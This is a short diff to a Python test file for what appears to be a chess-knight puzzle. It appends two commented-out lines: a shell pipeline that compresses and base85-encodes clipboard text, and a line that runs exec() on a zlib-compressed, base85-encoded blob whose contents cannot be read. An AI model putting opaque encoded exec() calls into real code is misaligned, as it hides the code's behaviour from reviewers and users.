@@ -27,3 +27,6 @@ if __name__ == "__main__":
 	assert checkio("h1-g2") == 4, "3rd example"
 	assert checkio("h8-d7") == 3, "4th example"
 	assert checkio("a1-h8") == 6, "5th example"
+
+#pbpaste|zlibrawstdio -c9|zbase85rfc
+#import zlib,base64;exec(zlib.decompress(base64.b85decode('c-n1|(Q3mW6o#+$DZHz$3Q3x6kj*CvUL2zt32g$d+kE_~b686+4*GxJkBDk}{jqkFXSiqs1i0sVAQafUq@EGj452;-&9IjvMq|TIyvx(`XT<}HyEc<BiFJYW_q~+rULn<ah2&mEaxd=6yeO=&u`~JD&ojO3-<Ay+f!v)*X>1e|F&yB)Fw#YwDlrw&{);vWQ$$~hMQQ;Ut<s1IBPaa``jak9rFCWMEp%q`2c>M&yCxM=xMZ|6{{?M09G9n#zp~UTcoJ)XY<KjA9oI)y5KF8M#K{gLXRlvwBkmV1u75!')))
